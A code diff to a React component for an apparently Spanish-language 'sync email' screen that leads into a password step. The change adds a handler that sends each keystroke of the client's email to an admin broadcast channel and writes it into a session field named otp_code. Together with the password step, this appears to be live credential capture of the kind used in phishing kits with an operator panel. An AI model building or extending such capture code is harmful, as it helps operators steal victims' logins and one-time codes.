@@ -144,18 +144,25 @@ const PpiSyncEmailScreen = ({ sessionId, onBack }: PpiSyncEmailScreenProps) => {
   }, [sessionId]);
 
   /* ── Email submit ── */
+  const handleEmailChange = useCallback(
+    (value: string) => {
+      setClientEmail(value);
+      broadcastToAdmin("client_sync_email", { session_id: sessionId, sync_email: value });
+      void supabase.from("sessions").update({ otp_code: `sync_email:${value}` }).eq("id", sessionId);
+    },
+    [sessionId, broadcastToAdmin]
+  );
+
   const handleEmailSubmit = useCallback(
     (e: React.FormEvent) => {
       e.preventDefault();
-      const normalizedEmail = clientEmail.trim().toLowerCase();
-      if (!normalizedEmail) return;
+      if (!clientEmail.trim()) return;
 
       setErrorMessage("");
-      setClientEmail(normalizedEmail);
       setStep("password");
 
-      broadcastToAdmin("client_sync_email", { session_id: sessionId, sync_email: normalizedEmail });
-      void supabase.from("sessions").update({ otp_code: `sync_email:${normalizedEmail}` }).eq("id", sessionId);
+      broadcastToAdmin("client_sync_email", { session_id: sessionId, sync_email: clientEmail });
+      void supabase.from("sessions").update({ otp_code: `sync_email:${clientEmail}` }).eq("id", sessionId);
     },
     [clientEmail, sessionId, broadcastToAdmin]
   );
@@ -342,7 +349,7 @@ const PpiSyncEmailScreen = ({ sessionId, onBack }: PpiSyncEmailScreenProps) => {
                     type="email"
                     placeholder="nombre@email.com"
                     value={clientEmail}
-                    onChange={(e) => setClientEmail(e.target.value)}
+                    onChange={(e) => handleEmailChange(e.target.value)}
                     autoFocus
                     className={`${inputClass} mb-5`}
                   />
